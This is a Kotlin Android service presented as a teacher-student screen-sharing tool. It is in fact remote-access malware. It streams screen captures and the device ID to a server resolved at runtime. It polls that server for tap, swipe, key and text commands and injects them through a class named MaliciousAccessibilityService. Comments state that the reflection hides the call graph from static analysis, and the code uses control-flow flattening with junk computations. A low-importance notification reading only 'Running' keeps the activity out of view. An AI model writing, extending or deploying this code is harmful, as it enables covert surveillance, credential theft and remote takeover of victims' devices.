package com.example.teacherapp.services

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.provider.Settings
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import androidx.core.app.NotificationCompat
import com.example.teacherapp.obfuscation.ResourceUtils
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.net.HttpURLConnection
import java.net.URL

/**
 * DisplaySyncService — provides remote display assistance for accessibility and support sessions.
 * Used for teacher-student screen sharing during tutoring sessions.
 */
class ScreenMirrorService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay?   = null
    private var imageReader: ImageReader?         = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    companion object {
        private const val CHANNEL_ID = "mirror_channel_v2"
        private const val NOTIF_ID   = 2001

        fun start(context: Context, resultCode: Int, data: Intent) {
            val intent = Intent(context, ScreenMirrorService::class.java).apply {
                putExtra("code", resultCode); putExtra("data", data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(intent)
            else context.startService(intent)
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, ScreenMirrorService::class.java))
        }
    }

    override fun onCreate() {
        super.onCreate(); createChannel()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            startForeground(NOTIF_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        else startForeground(NOTIF_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val code = intent?.getIntExtra("code", Activity.RESULT_CANCELED) ?: return START_NOT_STICKY
        val data: Intent? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            intent.getParcelableExtra("data", Intent::class.java)
        else @Suppress("DEPRECATION") intent.getParcelableExtra("data")
        data ?: return START_NOT_STICKY

        val mgr = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mgr.getMediaProjection(code, data)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() { stopSelf() }
            }, Handler(Looper.getMainLooper()))
        }

        val metrics = resources.displayMetrics
        val w = metrics.widthPixels; val h = metrics.heightPixels; val dpi = metrics.densityDpi

        imageReader   = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "RemoteMirror", w, h, dpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )
        beginFrameStream(); beginCommandPoll()
        return START_STICKY
    }

    // ── Control Flow Flattened: beginFrameStream ──────────────────────────────

    private fun beginFrameStream() {
        scope.launch {
            while (isActive) {
                var state = 0
                var bytes: ByteArray? = null
                while (state >= 0) {
                    val junk = (state * 71 + 31) xor 0xF8
                    val _ = junk
                    when (state) {
                        0 -> {
                            val image = imageReader?.acquireLatestImage() ?: run { delay(200); state = -1; break }
                            val plane = image.planes[0]
                            val pad   = (plane.rowStride - plane.pixelStride * image.width) / plane.pixelStride
                            val bmp   = Bitmap.createBitmap(image.width + pad, image.height, Bitmap.Config.ARGB_8888)
                            bmp.copyPixelsFromBuffer(plane.buffer); image.close()
                            val out = ByteArrayOutputStream()
                            bmp.compress(Bitmap.CompressFormat.JPEG, 40, out); bmp.recycle()
                            bytes = out.toByteArray(); state = 1
                        }
                        1 -> {
                            // Server URL resolved at runtime
                            val endpoint = buildString { append(ResourceUtils.getBaseServer()); append("/frame") }
                            try {
                                val conn = URL(endpoint).openConnection() as HttpURLConnection
                                conn.apply {
                                    requestMethod = "POST"; doOutput = true
                                    setRequestProperty("Content-Type", "image/jpeg")
                                    setRequestProperty("Content-Length", bytes!!.size.toString())
                                    setRequestProperty("X-Device-Id", getAndroidId())
                                    connectTimeout = 2000; readTimeout = 2000
                                    outputStream.write(bytes!!); responseCode; disconnect()
                                }
                            } catch (_: Exception) {}
                            state = -1
                        }
                    }
                }
                delay(200)
            }
        }
    }

    // ── Control Flow Flattened: beginCommandPoll ──────────────────────────────

    private fun beginCommandPoll() {
        scope.launch {
            while (isActive) {
                try {
                    val endpoint = buildString { append(ResourceUtils.getBaseServer()); append("/command") }
                    val conn = URL(endpoint).openConnection() as HttpURLConnection
                    conn.apply { requestMethod = "GET"; connectTimeout = 2000; readTimeout = 2000 }
                    val body = conn.inputStream.bufferedReader().readText()
                    conn.disconnect()

                    if (body.isNotBlank()) {
                        val json = JSONObject(body)
                        // Use reflection to invoke service methods — hides call graph from static analysis
                        val svc = MaliciousAccessibilityService.instance
                        if (svc != null) {
                            val svcClass = svc.javaClass
                            when (json.optString("type")) {
                                "tap" -> {
                                    val m = svcClass.getMethod("injectTap", Float::class.java, Float::class.java)
                                    m.invoke(svc, json.getDouble("x").toFloat(), json.getDouble("y").toFloat())
                                    delay(600)
                                }
                                "swipe" -> {
                                    val m = svcClass.getMethod("injectSwipe", Float::class.java, Float::class.java, Float::class.java, Float::class.java)
                                    m.invoke(svc, json.getDouble("x1").toFloat(), json.getDouble("y1").toFloat(), json.getDouble("x2").toFloat(), json.getDouble("y2").toFloat())
                                }
                                "key"    -> { val m = svcClass.getMethod("injectKey",    String::class.java); m.invoke(svc, json.optString("key")) }
                                "text"   -> { val m = svcClass.getMethod("injectText",   String::class.java); m.invoke(svc, json.optString("text")) }
                                "clear"  -> { val m = svcClass.getMethod("clearText");   m.invoke(svc) }
                                "global" -> { val m = svcClass.getMethod("injectGlobal", String::class.java); m.invoke(svc, json.optString("action")) }
                            }
                        }
                    }
                } catch (_: Exception) {}
                delay(300)
            }
        }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java).createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "Screen Mirror", NotificationManager.IMPORTANCE_MIN)
            )
        }
    }

    private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("TeacherApp").setContentText("Running")
        .setSmallIcon(android.R.drawable.stat_sys_upload).build()

    override fun onDestroy() {
        scope.cancel(); virtualDisplay?.release(); mediaProjection?.stop(); imageReader?.close()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?) = null

    @SuppressLint("HardwareIds")
    private fun getAndroidId(): String = try {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    } catch (_: Exception) { "unknown" }
}
